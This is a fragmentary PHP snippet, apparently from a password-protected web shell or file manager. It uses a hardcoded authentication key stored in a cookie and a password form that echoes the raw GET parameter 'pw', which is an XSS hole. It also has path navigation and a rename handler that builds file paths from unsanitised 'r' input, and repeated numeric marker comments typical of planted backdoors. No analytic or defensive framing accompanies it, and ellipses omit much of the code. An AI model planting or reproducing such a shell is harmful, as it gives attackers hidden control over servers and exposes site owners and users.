...
$auth_key = "e7e10a41d56385c9cb0dc5dda2f751f6";
...
$pass = false;
if (isset($_COOKIE['pw_name_18329'])) {
    if(($_COOKIE['pw_name_18329']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_18329'])) {
        if(($_POST['pw_name_18329']) == $auth_key) {
            setcookie("pw_name_18329", $_POST['pw_name_18329']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_18329' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726699902571814 1726699902944534 1726699902777401 1726699902354197
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726699902571814 1726699902944534 1726699902777401 1726699902354197
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726699902571814 1726699902944534 1726699902777401 1726699902354197
            $name = PATH . "/" . $_GET['r'];
